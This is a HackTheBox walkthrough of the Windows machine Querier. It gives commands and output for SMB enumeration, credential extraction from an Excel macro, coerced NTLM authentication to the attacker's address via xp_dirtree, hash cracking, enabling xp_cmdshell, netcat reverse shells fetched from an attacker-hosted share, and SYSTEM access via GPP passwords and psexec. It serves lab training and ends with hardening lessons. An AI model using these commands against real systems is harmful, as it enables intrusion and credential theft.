# HackTheBox - Querier Walkthrough

**Machine:** Querier  
**IP:** 10.129.35.228  
**Attacker IP:** 10.10.17.27  
**OS:** Windows  
**Difficulty:** Medium  
**Flags:**
- User: `64979c[redacted]829bc1e239`
- Root: `010a24[redacted]67b9387948`

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [SMB Enumeration](#2-smb-enumeration)
3. [Extracting Credentials from .xlsm](#3-extracting-credentials-from-xlsm)
4. [Initial MSSQL Access](#4-initial-mssql-access)
5. [Capturing the mssql-svc NTLM Hash](#5-capturing-the-mssql-svc-ntlm-hash)
6. [Cracking the Hash](#6-cracking-the-hash)
7. [Getting a Shell as mssql-svc](#7-getting-a-shell-as-mssql-svc)
8. [Privilege Escalation](#8-privilege-escalation)
9. [Conclusion & Key Takeaways](#9-conclusion--key-takeaways)

---

## 1. Reconnaissance

### 1.1 Why do we start with Nmap?
Before attacking any machine, we need to know what services are running, what ports are open, and what the operating system is. Nmap is the standard tool for network discovery and port scanning. We run two scans: a quick full port scan to find all open ports, and an aggressive scan on the interesting ports to get version information and run default scripts.

### 1.2 Commands Run

**Full port scan (fast):**
```bash
sudo nmap -p- -T4 10.129.35.228
```

**Aggressive scan on discovered ports:**
```bash
sudo nmap -p 135,139,445,1433,5985,47001 -sC -sV -A -T4 10.129.35.228 -oN querier_nmap.txt
```

### 1.3 Results & Analysis

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 RTM
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Key findings:**
- **Port 445 (SMB):** File sharing is enabled. The scan also revealed: `Message signing enabled but not required`. This is **critical** because it means we can perform NTLM relay/hash capture attacks later. If signing were required, captured hashes couldn't be relayed.
- **Port 1433 (MSSQL):** Microsoft SQL Server 2017 is running. This is our primary attack vector.
- **Ports 5985/47001 (WinRM):** Windows Remote Management is available. Could be useful later for remote access if we get credentials.
- **Hostname:** `QUERIER.HTB.LOCAL`

### 1.4 Adding to /etc/hosts
Because Windows authentication often relies on hostname resolution, we add the target to our hosts file:
```bash
echo "10.129.35.228 querier.htb.local" | sudo tee -a /etc/hosts
```

---

## 2. SMB Enumeration

### 2.1 Why check SMB first?
SMB (Server Message Block) is a common Windows file sharing protocol. Anonymous or null sessions often allow listing of shares, and sometimes shares contain sensitive files, credentials, or configuration data. It's always worth checking SMB early because it can provide quick wins.

### 2.2 Listing Shares
```bash
smbclient -L 10.129.35.228 -N
```

The `-N` flag means "no password" — we attempt a null session.

**Results:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Reports         Disk
```

The `Reports` share stands out because it's a custom share (not a default Windows share like ADMIN$ or C$).

### 2.3 Connecting to the Reports Share
```bash
smbclient \\10.129.35.228\Reports -N
```

Inside, we found:
```
Currency Volume Report.xlsm
```

We downloaded it:
```smb
get "Currency Volume Report.xlsm"
```

### 2.4 Why is an .xlsm file suspicious?
`.xlsm` stands for "Excel Macro-Enabled Workbook." Macros are scripts (typically written in VBA — Visual Basic for Applications) that can contain logic, including hardcoded credentials, database connection strings, or other sensitive information. Developers often accidentally hardcode credentials in macros.

---

## 3. Extracting Credentials from .xlsm

### 3.1 Understanding the .xlsm File Format
An `.xlsm` file is actually a ZIP archive containing XML files, binaries, and other resources. The macro code itself is stored in a binary file called `vbaProject.bin` inside the archive.

### 3.2 Extracting the Archive
```bash
unzip "Currency Volume Report.xlsm" -d xlsm_extracted
```

This creates a directory `xlsm_extracted/` with the following structure:
```
xlsm_extracted/
├── [Content_Types].xml
├── _rels/
├── docProps/
└── xl/
    ├── vbaProject.bin    <-- This contains the macro code
    ├── workbook.xml
    ├── worksheets/
    └── ...
```

### 3.3 Searching for Credentials
We use the `strings` command to extract human-readable text from the binary macro file, then grep for credential-related keywords:

```bash
strings xlsm_extracted/xl/vbaProject.bin | grep -i -E "uid|pwd|password|user|server"
```

**Output:**
```
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
```

### 3.4 What did we find?
This is a **database connection string** hardcoded directly into the Excel macro. It contains:
- **Username:** `reporting`
- **Password:** `PcwTWTHRwryjc$c6`
- **Database:** `volume`
- **Server:** `QUERIER`

**Lesson:** Never hardcode credentials in scripts, macros, or source code. They can be extracted with trivial effort.

---

## 4. Initial MSSQL Access

### 4.1 Why use impacket-mssqlclient?
MSSQL can be accessed in multiple ways, but `impacket-mssqlclient` (also known as `mssqlclient.py`) is one of the most reliable tools from the Impacket suite. It supports Windows authentication (`-windows-auth`), which is necessary when the SQL server is configured to use Windows accounts rather than SQL-native accounts.

### 4.2 Connecting to MSSQL
```bash
impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.129.35.228 -windows-auth
```

**Note:** The password contains a `$` symbol. We wrap the entire `user:password` combination in quotes so the shell doesn't interpret the `$` as a variable.

### 4.3 Checking Privileges
Once connected, we need to know what we can do. In MSSQL, `sysadmin` is the highest privilege level and allows executing operating system commands via `xp_cmdshell`.

```sql
SELECT SUSER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT USER_NAME();
```

**Result:**
- User: `QUERIER\reporting`
- Sysadmin: `0` (FALSE)

We're **not** a sysadmin. This means we cannot directly use `xp_cmdshell` yet. We need to escalate within MSSQL first.

### 4.4 Initial Enumeration with xp_dirtree
Even without sysadmin, MSSQL has built-in "extended stored procedures" that interact with the OS. One of these is `xp_dirtree`, which lists directory contents.

```sql
EXEC xp_dirtree 'C:\Users', 1, 0;
```

**Parameters explained:**
- `'C:\Users'` — The directory to list
- `1` — Depth (how many levels deep)
- `0` — List directories only (1 would include files too)

This revealed a user called `mssql-svc`, which is likely the service account running the SQL Server process. This becomes our next target.

---

## 5. Capturing the mssql-svc NTLM Hash

### 5.1 The Core Concept: Forced Authentication
When we run `xp_dirtree` and point it at an SMB share on **our** machine (`\\10.10.17.27\fake_share\`), Windows tries to authenticate to that share using the **current user's credentials** — in this case, the `mssql-svc` service account. Because SMB signing is **not required** on the target (we saw this in the nmap scan), we can stand up a malicious SMB server that captures the NTLM authentication handshake.

### 5.2 Why does this work?
- The SQL Server service runs as `mssql-svc`
- When SQL Server executes `xp_dirtree` against a remote UNC path, the OS initiates an SMB connection
- The OS automatically tries to authenticate as the service account
- Our listener captures the NTLMv2 hash
- This is essentially a **forced authentication** or **coerced authentication** attack

### 5.3 Setting up the Listener

We use **Responder**, which listens for various authentication protocols (SMB, LLMNR, NBT-NS, etc.) and captures hashes:

```bash
sudo Responder -I tun0
```

The `-I tun0` specifies our VPN interface.

### 5.4 Triggering the Authentication
Back in the MSSQL shell:
```sql
EXEC xp_dirtree '\\10.10.17.27\fake_share\', 1, 0;
```

**What happens:**
1. The SQL Server process (running as `mssql-svc`) tries to access `\\10.10.17.27\fake_share\`
2. Responder responds to the SMB request
3. The Windows machine sends an NTLMv2 authentication challenge/response
4. Responder captures the hash

### 5.5 Captured Hash
```
[SMB] NTLMv2-SSP Client   : 10.129.35.228
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:cbeb481c09a37c9b:5A69E6835E711E52577B77C6EE8C1794:...[snip]...
```

We saved this to `mssql-svc.hash`.

---

## 6. Cracking the Hash

### 6.1 What is an NTLMv2 Hash?
NTLMv2 is a challenge-response authentication protocol used in Windows. When we capture the hash, we don't get the plaintext password — we get a hash that represents the password encrypted with a nonce (challenge). We can crack this offline by trying many passwords and seeing which one produces the same hash.

### 6.2 Why use rockyou.txt?
`rockyou.txt` is a massive wordlist of real passwords leaked from the RockYou breach. It's the standard starting point for password cracking because it contains the most common passwords people actually use.

### 6.3 Cracking Commands

**With Hashcat:**
```bash
hashcat -m 5600 mssql-svc.hash /usr/share/wordlists/rockyou.txt
```
- `-m 5600` specifies the hash mode for NTLMv2

**With John the Ripper:**
```bash
john mssql-svc.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### 6.4 Result
```
mssql-svc::QUERIER:...[snip]...:corporate568
```

**Password:** `corporate568`

---

## 7. Getting a Shell as mssql-svc

### 7.1 Logging in as mssql-svc
```bash
impacket-mssqlclient mssql-svc:'corporate568'@10.129.35.228 -windows-auth
```

Check privileges again:
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

**Result:** `1` (TRUE)

We are now a **sysadmin**! This means we can enable and use `xp_cmdshell` to execute arbitrary Windows commands.

### 7.2 Enabling xp_cmdshell
`xp_cmdshell` is a powerful extended stored procedure that spawns a Windows command shell and passes a string for execution. It's disabled by default for security reasons, but as sysadmin we can re-enable it:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Explanation:**
- `sp_configure` is used to view or change server configuration options
- `show advanced options` must be enabled first before we can modify `xp_cmdshell`
- `RECONFIGURE` applies the changes

### 7.3 Getting a Reverse Shell

**Why a reverse shell?**
`xp_cmdshell` executes commands but doesn't give us an interactive shell. A reverse shell connects back to our attacker machine, giving us a persistent, interactive command prompt.

**Setup:**
1. **Terminal 1:** Start SMB server to host `nc.exe` (Windows netcat binary)
   ```bash
   sudo python3 smbserver.py -smb2support shared /usr/share/windows-resources/binaries/
   ```

2. **Terminal 2:** Start netcat listener
   ```bash
   nc -lvnp 4444
   ```

3. **MSSQL Shell:** Execute reverse shell
   ```sql
   EXEC xp_cmdshell '\\10.10.17.27\shared\nc.exe -e cmd.exe 10.10.17.27 4444';
   ```

**What happens:**
- `nc.exe` is copied from our SMB share and executed on the target
- `-e cmd.exe` tells netcat to execute `cmd.exe` and pipe its input/output through the network connection
- The target connects back to our listener on port 4444
- We receive an interactive command prompt

### 7.4 Confirming Access
```cmd
C:\Windows\system32> whoami
querier\mssql-svc

C:\Windows\system32> hostname
QUERIER
```

### 7.5 User Flag
```cmd
type C:\Users\mssql-svc\Desktop\user.txt
```
**Flag:** `64979c3[redacted]829bc1e239`

---

## 8. Privilege Escalation

### 8.1 Initial Enumeration
We check our current privileges:
```cmd
whoami /priv
```

We likely see `SeImpersonatePrivilege`, which on older Windows versions allows "Potato" attacks. However, on Windows Server 2019, these are often patched. We need another path.

### 8.2 PowerUp.ps1 — Automated Privilege Escalation Checks
**PowerUp.ps1** is part of PowerSploit, a collection of PowerShell modules for penetration testing. It automates the process of checking for common Windows privilege escalation vectors.

**Transferring the file:**
We use the same SMB share technique:
```cmd
copy \\10.10.17.27\shared\PowerUp.ps1 C:\Users\mssql-svc\Documents\
cd C:\Users\mssql-svc\Documents
```

**Running PowerUp:**
```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

The `-ep bypass` flag sets the execution policy to bypass, allowing us to run unsigned PowerShell scripts.

### 8.3 PowerUp Results
PowerUp found multiple vulnerabilities:

#### Finding 1: UsoSvc Service Abuse
```
ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
```

**What is UsoSvc?**
`UsoSvc` (Update Orchestrator Service) is a Windows system service that runs as `LocalSystem`. PowerUp discovered that we have permission to modify this service's configuration. The `Invoke-ServiceAbuse` function can modify the service to execute arbitrary commands as SYSTEM.

#### Finding 2: Group Policy Preferences (GPP)
```
Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
```

**What is GPP and why is this a vulnerability?**
Group Policy Preferences allowed administrators to create policies with embedded credentials (e.g., creating local admin accounts across domains). Microsoft encrypted these passwords using AES.

**The critical flaw:** Microsoft hardcoded the AES encryption key into every Windows installation, and then **accidentally published this key in public MSDN documentation**. This means anyone can decrypt GPP passwords. The key is publicly available, and tools like PowerUp automatically decrypt it.

**Decrypted Administrator Password:** `MyUnclesAreMarioAndLuigi!!1!`

### 8.4 Escalating to SYSTEM

We have **two viable paths**. We chose the most direct one.

#### Path Chosen: psexec.py with Admin Credentials
Since we already have the plaintext administrator password, we can use `psexec.py` (another Impacket tool) to remotely execute a service and get a SYSTEM shell:

```bash
impacket-psexec 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.129.35.228'
```

**How psexec works:**
1. Authenticates to the target using SMB with the provided credentials
2. Uploads a small service executable to the `ADMIN$` share
3. Creates and starts a Windows service on the target
4. The service runs as `NT AUTHORITY\SYSTEM`
5. Returns an interactive shell

**Result:**
```cmd
C:\Windows\system32> whoami
nt authority\system
```

#### Alternative Path: UsoSvc Abuse
If we didn't have the GPP password, we could have abused the `UsoSvc` service:

1. Start a new netcat listener:
   ```bash
   nc -lvp 6666
   ```

2. In PowerUp:
   ```powershell
   Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.17.27\shared\nc.exe -e cmd.exe 10.10.17.27 6666"
   ```

This modifies the service to execute our netcat reverse shell command, which runs as SYSTEM when the service starts.

### 8.5 Root Flag
```cmd
type C:\Users\Administrator\Desktop\root.txt
```
**Flag:** `010a24[redacted]b9387948`

---

## 9. Conclusion & Key Takeaways

### Attack Chain Summary
1. **SMB Enumeration** → Found `Reports` share with macro-enabled Excel file
2. **Credential Harvesting** → Extracted hardcoded MSSQL credentials from macro
3. **MSSQL Access** → Connected as `reporting` user
4. **Hash Capture** → Used `xp_dirtree` + Responder to force `mssql-svc` authentication
5. **Password Cracking** → Cracked NTLMv2 hash offline
6. **Shell Access** → Logged in as `mssql-svc` (sysadmin), enabled `xp_cmdshell`, got reverse shell
7. **Privilege Escalation** → PowerUp found GPP password + vulnerable service
8. **SYSTEM Access** → Used `psexec.py` with decrypted admin password

### Critical Lessons

1. **Hardcoded Credentials:** The initial foothold came from credentials hardcoded in an Excel macro. Always check scripts, macros, and configuration files for secrets.

2. **SMB Signing:** `Message signing enabled but not required` allowed us to capture the NTLM hash. In a properly hardened environment, SMB signing should be required.

3. **Forced Authentication:** `xp_dirtree` and similar MSSQL procedures can trigger outbound SMB connections. Any SQL user can potentially force the service account to authenticate to an attacker-controlled server.

4. **Group Policy Preferences:** GPP is a well-known Windows vulnerability. The encryption key is public, making GPP passwords trivial to decrypt. Always check for `Groups.xml` and `ScheduledTasks.xml` in Group Policy directories.

5. **Service Account Isolation:** The `mssql-svc` account had sysadmin privileges in SQL Server. Service accounts should have the minimum necessary privileges. If `reporting` had been properly restricted, the hash capture might not have led to a full compromise.

### Tools Used
| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| smbclient | SMB share enumeration and file transfer |
| unzip / strings | Extracting and analyzing .xlsm macros |
| impacket-mssqlclient | MSSQL connection and interaction |
| Responder | Capturing NTLM authentication hashes |
| hashcat / john | Offline password cracking |
| impacket-smbserver | Hosting SMB shares for file transfer |
| nc (netcat) | Reverse shells |
| PowerUp.ps1 | Automated Windows privilege escalation checks |
| impacket-psexec | Remote SYSTEM shell execution |

---

**Machine Complete!** 
